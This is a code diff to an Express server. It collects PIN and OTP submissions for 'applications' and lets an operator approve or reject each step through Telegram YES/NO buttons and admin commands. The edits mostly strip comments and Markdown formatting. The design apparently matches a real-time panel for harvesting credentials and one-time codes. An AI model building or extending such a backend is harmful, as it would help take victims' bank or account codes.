@@ -24,18 +24,13 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
-if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-  console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment variables.');
-  console.error('Please set these in Render or .env file.');
-}
-
 // In-memory store
 const applications = {};
 
-// ─── Telegram helper ───
+// Telegram helper (NO parse_mode – avoids markdown errors)
 async function sendTelegramMessage(message, buttons = null) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
-  const body = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' };
+  const body = { chat_id: TELEGRAM_CHAT_ID, text: message };
   if (buttons) body.reply_markup = { inline_keyboard: buttons };
   try {
     const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
@@ -88,11 +83,9 @@ app.post('/api/send-pin', async (req, res) => {
   const app = applications[applicationId];
   if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
 
-  // Check block
   if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
     return res.status(429).json({ ok: false, blocked: true, message: 'Too many attempts. Please wait 5 minutes.' });
   }
-  // Reset if block expired
   if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) <= new Date()) {
     app.pinAttempts = 0;
     app.pinBlockedUntil = null;
@@ -147,7 +140,7 @@ app.post('/api/resend-otp', async (req, res) => {
   res.json({ ok: true, status: 'otp_resent' });
 });
 
-// Status check (with PIN attempts & block info)
+// Status check
 app.get('/api/status/:applicationId/:step', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
@@ -171,7 +164,6 @@ app.get('/api/status/:applicationId/:step', (req, res) => {
 app.post('/api/telegram-webhook', async (req, res) => {
   const update = req.body;
 
-  // Handle inline callback (YES/NO buttons)
   if (update.callback_query) {
     const query = update.callback_query;
     const { action, step, applicationId } = JSON.parse(query.data);
@@ -208,7 +200,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     return res.sendStatus(200);
   }
 
-  // Handle regular messages (admin commands)
   if (update.message && update.message.text) {
     const text = update.message.text.trim();
     const chatId = update.message.chat.id;
@@ -236,13 +227,11 @@ app.post('/api/telegram-webhook', async (req, res) => {
   res.sendStatus(200);
 });
 
-// Fallback: serve index.html for any non-API route
+// Fallback
 app.get('*', (req, res) => {
   res.sendFile(path.join(frontendPath, 'index.html'));
 });
 
-// Start server
 app.listen(PORT, () => {
   console.log(`🚀 Server running on port ${PORT}`);
-  console.log(`📁 Serving frontend from: ${frontendPath}`);
 });
